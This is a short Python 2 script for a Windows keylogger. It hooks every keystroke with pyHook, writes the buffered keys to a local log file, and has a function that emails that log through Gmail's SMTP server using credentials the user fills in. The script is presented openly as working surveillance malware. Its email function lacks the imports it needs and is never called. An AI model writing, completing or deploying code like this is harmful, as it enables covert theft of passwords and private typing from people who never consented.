import pyHook
import pythoncom
import sys
import os

file_log = 'log.txt' 
data = ''  # To hold logged keys


def OnKeyBoardEvent(event):
    global data
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    # logging.log(10,chr(event.Ascii))

    if event.Ascii == 8:  # Exit on backspace
        exit(1)
    elif event.Ascii == 13:  # Carraige return representation
        key = '<ENTER>'
    elif event.Ascii == 9:  # TAB Representation
        key = '<TAB>'
    else:
        key = chr(event.Ascii)

    data += key

    if len(data) > 100:
        OutputKeys()
    return True


def OutputKeys():
    global data

    f = open('log.txt', 'a')  # Open log file to write keyss
    f.write(data)
    f.close()
    data = ''
    return True

def Email():
    fromAddress = "Your email address"  # Change this
    toAddress = "Your email address"    # Change this
    message = MIMEMultipart()
    message['From'] = fromAddress
    message['To'] = toAddress
    message['Subject'] = "python keys"
    body = "TEST BODY"

    message.attach(MIMEText(body, 'plain'))

    # Attachment
    filename = "log.txt"
    attachment = open(filename, "rb")

    finalAttachment = MIMEBase('application', 'octet-stream')
    finalAttachment.set_payload((attachment).read())
    encoders.encode_base64(finalAttachment)
    finalAttachment.add_header('Content-Description', "attachment; filename= %s" %filename)

    message.attach(finalAttachment)
    finalMessage = message.as_string()

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    try:
        s.login(fromAddress, "Your password")  # Change this
    except smtplib.SMTPAuthenticationError:
        print "Invalid creds"
    try:
        s.sendmail(fromAddress, toAddress, finalMessage)
        print "Email Sent!"
    except:
        print "Unable to send email"
    s.quit()



hooks_manager=pyHook.HookManager()     # Create a hook
hooks_manager.KeyDown=OnKeyBoardEvent  # Assign keydown event handler
hooks_manager.HookKeyboard()           # assign hook to the keyboard
pythoncom.PumpMessages()             